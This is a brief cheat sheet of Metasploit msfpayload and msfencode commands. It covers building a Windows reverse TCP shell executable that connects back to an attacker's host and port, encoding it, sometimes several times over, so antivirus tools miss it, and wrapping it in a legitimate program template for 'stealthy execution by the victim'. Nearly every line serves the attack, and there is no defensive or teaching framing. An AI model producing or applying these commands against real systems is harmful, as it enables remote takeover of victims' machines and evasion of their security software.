- msfpayload windows/shell_reverse_tcp LHOST=[host_ip] LPORT=[host_port] X > [path]/filename.exe
// Creates a payload that would be executed on a Windows machine.
// X = Create the file in windows EXE format.

- msfpayload windows/shell_reverse_tcp LHOST=[host_ip] LPORT=[host_port] | msfencode -e [encoder] -t [type] > [path]/filename

// Creates the same payload but encoded, for the AVs not to detect it.
// -e = Encode with [encoder].
// -t = Output file type. (Exe in this case).
// msfencode can be used with the -c flag to use an encoder more than one time,z providing better chances to go undetected.
// Using multi-encoding (piping the output with -t raw to other encoding methods) is much encouraged.
/* msfencode can be used with the -x flag to use a template, ensuring stealthy execution by the victim, use with -o [path]/filename.exe for the output file. Also, use with the -k flag to make msfencode configure the payload to be run in a separate thread from the main EXE's, if -k wasn't used with a GUI-based app, no console window will pop up when the EXE is run */
